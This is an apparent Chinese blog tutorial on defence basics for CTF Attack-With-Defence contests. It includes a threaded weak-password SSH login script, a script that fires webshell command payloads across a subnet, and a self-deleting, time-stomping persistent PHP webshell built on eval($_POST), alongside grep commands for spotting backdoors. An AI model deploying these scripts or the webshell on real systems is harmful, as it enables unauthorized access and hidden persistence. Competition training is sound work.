# 原创
：  CTF—AWD防御起手式

# CTF—AWD防御起手式

### 前言

AWD (Attack With Defence)，比赛中每个队伍维护多台服务器，服务器中存在多个漏洞，利用漏洞攻击其他队伍可以进行得分，修复漏洞可以避免被其他队伍攻击失分。

### 改SSH密码

官方在给出服务器密码时，很有可能是默认的，需要赶快修改自己的密码并尝试能不能登录别人的靶机<br/> 存在某些队伍忘记修改SSH弱口令，尝试使用python脚本连接获取flag

```
import paramiko #paramiko是一个用于做远程控制的模块
import threading #threading模块是Python里面常用的线程模块
def ssh2(ip,username,passwd,cmd):
  try:
    ssh=paramiko.SSHClient() #创建一个ssh对象
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) #自动选择yes
    ssh.connect(ip,22,username,passwd,timeout=0.1) #连接服务器
    for m in cmd:
      stdin,stdout,stderr=ssh.exec_command(m) #执行操作
      out=stdout.readlines() #获取命令执行的结果
      for o in out:
        print(o)
    print('%s\tOK\n'%(ip))
    ssh.close()
  except:
    print('%s\tError\n'%(ip))
if __name__=='__main__':
  cmd=['cat /flag']
  username='root'
  passwd='root'
  threads=[10]
  for i in range(149,151):
    ip='192.168.75.'+str(i)
    a=threading.Thread(target=ssh2,args=(ip,username,passwd,cmd))
    a.start()

```

### 命令行简单查找后门
1.  find / -name ‘*.php’ | xargs grep -n ‘eval’ 1.  find / -name ‘*.php’ | xargs grep -n ‘system’ 1.  find / -name ‘*.php’ | xargs grep -n ‘assert’ 
<br/> 描述：存在某些队伍靶机检测没有做到位，导致遗留后门，利用python脚本检测并加以利用

```
import requests
part_url='/shell.php?pass=system(%27cat /flag%27);'
for s in range(149,151):
    try:
      ip1='192.168.75.'+str(s)
      ip='http://'+ip1+part_url
      print(ip)
      res=requests.get(url=ip,timeout=0.1)
      if res.status_code!=404:
        print(ip1)
        with open('flag.txt','a') as f:
          f.write(ip1+'   '+res.text)
    except Exception as e:
      pass

```

脚本执行成功后会在当前目录下生成一个flag.txt存储flag

<br/> 或者使用bash

<br/> 命令行单独查看

### 信息收集

nmap探测目标网段存活主机<br/> 使用”-r”选项表示不会随机的选择端口扫描

### AWD不死马与克制方法

##### 一个简单的不死马

```
&lt;?php
    ignore_user_abort(true);
    set_time_limit(0);
    unlink(__FILE__);
    $file = '.config.php';
    $code = '&lt;?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72"){&lt;span class="label label-primary"&gt;@eval($_POST[a]);}&lt;/span&gt; ?&gt;';
    //pass=pass
    while (1){
        file_put_contents($file,$code);
        system('touch -m -d "2018-12-01 09:10:12" .config.php');
        usleep(5000);
    }
?&amp;gt;

```

在AWD比赛中，不死马对于维持权限十分有效。将该php文件上传到服务器，然后进行访问，会在该路径下循环生成名字为.config.php的不死马隐藏文件<br/> 蚁剑连接

##### 简单介绍一下PHP不死马代码

```
&lt;?php
    ignore_user_abort(true); //设置与客户机断开是否会终止脚本的执行，这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行
    set_time_limit(0); //设置脚本最大执行时间，这里设置为0，即没有时间方面的限制
    unlink(__FILE__); //删除文件本身，以起到隐蔽自身的作用
    $file = '.config.php';
    $code = '&lt;?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72"){&lt;span class="label label-primary"&gt;@eval($_POST[a]);}&lt;/span&gt; ?&gt;'; //进行校验是为了防止自家木马被其他人利用
    //pass=pass
    while (1){
        file_put_contents($file,$code);
        system('touch -m -d "2018-12-01 09:10:12" .3.php');
        usleep(5000); //while循环中每隔usleep(5000)即写新的后门文件，system命令用于修改文件的创建时间或修改时间，因为在AWD比赛中会有队伍使用find命令查看文件的修改时间
    }
?&amp;gt;

```

##### 使用条件竞争写入同名文件进行克制不死马

对于不死马，直接删除脚本是没有用的，因为php执行的时候已经把脚本读进去解释成opcode运行了<br/> 关于opcode有：https://www.laruence.com/2008/06/18/221.html<br/> 这里使用条件竞争写入同名文件进行克制不死马<br/> 可以看到现在.config.php文件内容仍为：

<br/> 我们上传一个test.php的php文件，注意usleep需要比不死马小，$code修改为无害内容

<br/> 上传至服务器访问<br/> 再次查看.config.php文件内容，可以看到内容已无害

   申明：本账号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法。

###### **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/direct/2f74894cf8e04b7f87d9716681f6e26b.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/direct/5b4209eac3784bd18f5e1cd6a5157e4e.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/direct/4a89b0c2a52a4f569a970e55dcbac0b4.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/direct/4f211474c8ab4a5a910884e1d3423310.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/direct/54c2816350ae4bf787d1c6eec0d4e837.png" width="665"/>

应急响应笔记

学习路线
